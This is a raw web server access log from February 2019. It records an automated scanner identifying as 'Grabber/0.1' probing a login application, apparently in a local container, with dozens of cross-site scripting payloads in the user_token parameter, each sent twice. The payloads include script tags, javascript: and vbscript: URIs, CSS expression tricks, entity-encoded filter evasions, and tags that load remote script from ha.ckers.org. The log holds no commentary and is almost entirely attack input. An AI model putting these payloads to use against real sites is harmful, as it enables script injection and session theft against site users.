172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /?user_token=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /?user_token=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:35 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
